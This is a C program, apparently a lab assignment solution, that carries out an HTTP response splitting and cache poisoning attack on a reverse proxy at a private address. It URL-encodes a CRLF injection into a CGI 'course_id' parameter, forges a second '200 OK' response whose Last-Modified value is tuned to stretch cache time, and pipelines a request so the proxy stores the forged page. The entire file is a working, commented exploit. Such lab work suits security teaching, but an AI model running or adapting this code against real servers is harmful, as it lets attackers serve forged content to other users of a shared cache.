#include <stdio.h>      
#include <stdlib.h>   
#include <string.h>   
#include <time.h>      
#include <unistd.h>   
#include <sys/socket.h>
#include <netinet/in.h> 
#include <arpa/inet.h>  

#define ID "319028957"         // edens or geva ID to inject into cached page
#define ONE_HOUR 3600                // Number of seconds in one hour
#define TARGET_IP "192.168.1.202"    // Reverse proxy server IP address
#define TARGET_PORT 8080             // Reverse proxy server port
#define BUFFER_SIZE 8192             // Size of receive buffer for server responses

/**
 * Generates an RFC 1123 formatted timestamp for the Last-Modified header.
 * The timestamp is set to exactly 1 hour before the current time.
 * 
 * This ensures the proxy cache formula Cache_Time = (Current_Time - Last_Modified) * 0.1
 * gives us approximately 360 seconds (6 minutes) of cache duration.
 * 
 * @param buffer Output buffer to store the formatted timestamp
 * @param buffer_size Size of the output buffer
 */
void generate_last_modified(char *buffer, size_t buffer_size) {
    time_t current_time = time(NULL);                 // Get current Unix timestamp
    time_t modified_time = current_time - ONE_HOUR;   // Subtract 1 hour for cache control
    
    struct tm *gmt = gmtime(&modified_time);          // Convert to GMT/UTC time structure
    
    // Format timestamp as "Day, DD Mon YYYY HH:MM:SS GMT"
    strftime(buffer, buffer_size, "%a, %d %b %Y %H:%M:%S GMT", gmt);
}

/**
 * URL-encodes a string according to RFC 3986.
 * 
 * Encodes all characters except unreserved characters (A-Z, a-z, 0-9, -, _, ., ~).
 * Spaces are converted to '+'. All other characters are percent-encoded as %XX.
 * 
 * @param str Input string to encode
 * @return Pointer to static buffer containing the encoded string
 */
char* url_encode(const char *str) {
    static char encoded[8192];  // Static buffer to hold encoded result
    char *ptr = encoded;        // Pointer to current position in output buffer
    
    while (*str) {  // Iterate through each character in input string
        // Check if character is unreserved (allowed without encoding)
        if ((*str >= 'A' && *str <= 'Z') ||   // Uppercase letters
            (*str >= 'a' && *str <= 'z') ||   // Lowercase letters
            (*str >= '0' && *str <= '9') ||   // Digits
            *str == '-' || *str == '_' || *str == '.' || *str == '~') {  // Special unreserved chars
            *ptr++ = *str;  // Copy character as-is
        } else if (*str == ' ') {
            *ptr++ = '+';   // Encode space as plus sign
        } else {
            // Encode all other characters as %XX (hexadecimal)
            sprintf(ptr, "%%%02X", (unsigned char)*str);
            ptr += 3;  // Move pointer past the 3-character encoded sequence
        }
        str++;  // Move to next input character
    }
    *ptr = '\0';  // Null-terminate the encoded string
    
    return encoded;  // Return pointer to static buffer
}

/**
 * Constructs the complete HTTP request with response splitting payload.
 * 
 * Creates a GET request to /cgi-bin/course_selector with a malicious 'course' parameter.
 * The parameter contains a URL-encoded HTTP response splitting attack that:
 * 1. Breaks out of the original response with CRLF injection
 * 2. Terminates the first response with Content-Length: 0
 * 3. Injects a second HTTP/1.1 200 OK response with:
 *    - Calculated Content-Length matching the body size
 *    - Last-Modified header (current time - 1 hour) for cache control
 *    - Content-Type: text/html
 *    - Body containing <HTML>[ID]</HTML>
 * 
 * @return Pointer to static buffer containing the full HTTP request
 */
char* build_full_request() {
    char last_modified[128];  // Buffer for Last-Modified timestamp
    generate_last_modified(last_modified, sizeof(last_modified));  // Generate timestamp
    
    char body[256];  // Buffer for HTML body content
    // Create HTML body with student ID
    snprintf(body, sizeof(body), "<HTML>%s</HTML>", ID);
    
    size_t body_length = strlen(body);  // Calculate exact body length for Content-Length header
    
    char second_response[2048];  // Buffer for the injected (fake) HTTP response
    // Construct the fake HTTP/1.1 200 OK response
    snprintf(second_response, sizeof(second_response),
        "HTTP/1.1 200 OK\r\n"               // Status line for fake response
        "Content-Length: %zu\r\n"           // Exact body length to avoid truncation
        "Last-Modified: %s\r\n"             // Cache control header (1 hour ago)
        "Content-Type: text/html\r\n"       // Specify HTML content type
        "\r\n"                              // Empty line separates headers from body
        "%s",                               // The actual HTML body
        body_length,
        last_modified,
        body
    );
    
    char injection[4096];  // Buffer for the CRLF injection payload
    // Build the injection: CRLF + Content-Length: 0 + CRLF + fake response
    snprintf(injection, sizeof(injection),
        "\r\n"                    // CRLF to break out of Location header
        "Content-Length: 0\r\n"   // Terminate first response early
        "\r\n"                    // Empty line ends first response headers
        "%s",                     // The complete fake second response
        second_response
    );
    
    char *encoded = url_encode(injection);  // URL-encode the entire injection payload
    
    static char full_request[16384];  // Static buffer for complete HTTP request
    // Build the first HTTP request with the encoded injection in course_id parameter
    snprintf(full_request, sizeof(full_request),
        "GET /cgi-bin/course_selector?course_id=A%s HTTP/1.1\r\n"  // Vulnerable endpoint
        "Host: 192.168.1.202:8080\r\n"                              // Proxy host header
        "Connection: Keep-Alive\r\n"                                // Keep connection open for pipelining
        "\r\n",                                                     // End of request headers
        encoded
    );
    
    return full_request;  // Return pointer to static buffer
}

int main(void) {
    // Variable declarations
    int sockfd;                      // Socket file descriptor
    struct sockaddr_in server_addr;  // Server address structure
    char buffer[BUFFER_SIZE];        // Buffer for receiving server responses
    ssize_t bytes_sent, bytes_received;  // Track number of bytes sent/received
    
    // Create a TCP socket (IPv4, stream-based, default protocol)
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {  // Check if socket creation failed
        exit(1);
    }
    
    // Initialize server address structure to zeros
    memset(&server_addr, 0, sizeof(server_addr));

    server_addr.sin_family = AF_INET;              // IPv4 address family
    server_addr.sin_port = htons(TARGET_PORT);     // Convert port to network byte order
    
    // Convert IP address string to binary form and store in server_addr
    if (inet_pton(AF_INET, TARGET_IP, &server_addr.sin_addr) <= 0) {
        close(sockfd);  // Clean up socket on error
        exit(1);
    }
    
    // Establish TCP connection to the proxy server
    if (connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        close(sockfd);  // Clean up socket on error
        exit(1);
    }

    // ========== SEND FIRST REQUEST (THE SPLITTER) ==========
    // This request triggers the response splitting vulnerability
    // The payload is injected into the course_id parameter
    // The server reflects it into the Location header without sanitization
    
    char *first_request = build_full_request();  // Build the malicious request
    size_t request_len = strlen(first_request);  // Get length of request
    
    // Send the first request to the proxy
    bytes_sent = send(sockfd, first_request, request_len, 0);
    if (bytes_sent < 0 || (size_t)bytes_sent != request_len) {  // Check if send failed
        fprintf(stderr, "Error: Failed to send first request\n");
        close(sockfd);
        exit(1);
    }
    
    // ========== SEND SECOND REQUEST (THE TARGET) ==========
    // This is the page we want to poison in the proxy's cache
    // The proxy will associate our fake response with THIS request
    
    const char *second_request = 
        "GET /67607.html HTTP/1.1\r\n"         // Request the target page
        "Host: 192.168.1.202:8080\r\n"         // Must match cache key
        "Connection: close\r\n"                // Close connection after this request
        "\r\n";                                // End of request headers
    
    size_t second_len = strlen(second_request);  // Get length of second request
    
    // Send the second request (should be pipelined immediately after first)
    bytes_sent = send(sockfd, second_request, second_len, 0);
    if (bytes_sent < 0 || (size_t)bytes_sent != second_len) {  // Check if send failed
        close(sockfd);
        exit(1);
    }

    // ========== RECEIVE RESPONSE ==========
    // Read the server's response (may contain multiple responses due to splitting)
    bytes_received = recv(sockfd, buffer, BUFFER_SIZE - 1, 0);
    if (bytes_received < 0) {  // Check if receive failed
        close(sockfd);
        exit(1);
    }

    buffer[bytes_received] = '\0';  // Null-terminate the received data
    printf("%s", buffer);           // Print the response to stdout
    
    close(sockfd);  // Close the socket connection
    return 0;       // Exit successfully
}
